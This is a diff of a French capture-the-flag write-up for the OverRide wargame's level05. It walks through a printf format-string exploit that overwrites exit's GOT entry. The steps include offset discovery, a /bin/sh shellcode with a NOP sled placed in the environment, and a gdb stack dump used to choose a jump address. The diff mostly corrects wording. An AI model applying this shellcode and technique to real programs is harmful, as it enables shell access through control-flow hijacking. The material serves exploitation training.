@@ -1,8 +1,8 @@
 # Level05
 
-Nous devons réaliser un GOT Override, on un printf string format exploit
+Nous devons réaliser un GOT Override, grace à l'exploit sur `printf`
 
-On va remplacer l'adresse d'exit qui est appelé juste apres printf par l'adresse de notre shellcode
+On va remplacer l'adresse d'exit qui est appelé juste après printf par l'adresse de notre shellcode
 que nous placerons dans l'env.
 
 On cherche l'adresse d'exit dans la GOT avec objdump -R
@@ -21,43 +21,28 @@ OFFSET   TYPE              VALUE
 ```
 On trouve 0x080497e0
 
-On cherche l'offset auquel printf peut override
+Maintenat, on cherche l'offset auquel printf peut override
 ```
 level05@OverRide:~$ python -c 'print "B"*4 + "%08x."*20' | ./level05
 bbbb00000064.f7fcfac0.f7ec3add.ffffd66f.ffffd66e.00000000.ffffffff.ffffd6f4.f7fdb000.62626262.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.
 ```
 
-On trouve 10, on peut le vérifier ainsi:
+On trouve donc nos B à la 10ième positions. (On voit que c'est 62 et non 42, vu que notre string est mis en minuscule)
 ```
 level05@OverRide:~$ ./level05
 BBBB%10$p
 bbbb0x62626262
 ```
 
-On place notre shellcode dans l'env précédé par 100 NOP:
+On place notre shellcode dans l'env précédé de 100 NOP:
 ```
 export SHELLCODE=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x
 68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"'`
 ```
 
-On cherche l'adresse d'un NOP sled dans la stack:
+On cherche l'adresse d'un NOP slide dans la stack:
 ```
 level05@OverRide:~$ gdb ./level05
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "x86_64-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
-(gdb) b *main
-Breakpoint 1 at 0x8048444
-(gdb) r
-Starting program: /home/users/level05/level05
-
 Breakpoint 1, 0x08048444 in main ()
 (gdb) x/200x $esp
 0xffffd69c:     0xf7e45513      0x00000001      0xffffd734      0xffffd73c
@@ -104,9 +89,9 @@ Breakpoint 1, 0x08048444 in main ()
 0xffffd92c:     0x30373520      0x34203630      0x00323432      0x5f485353
 ```
 
-On choisi un NOP pres du shellcode: 0xffffd8d0
+On choisi l'adresse d'un NOP près du shellcode: 0xffffd8d0
 
-Maintenant on va diviser notre adresse en 2 short pour pouvoir l'injecter sinon la valeur est trop grande.
+Maintenant on va diviser notre adresse en 2 `short` pour pouvoir l'injecter sinon la valeur est trop grande.
 
 ```
 $ node
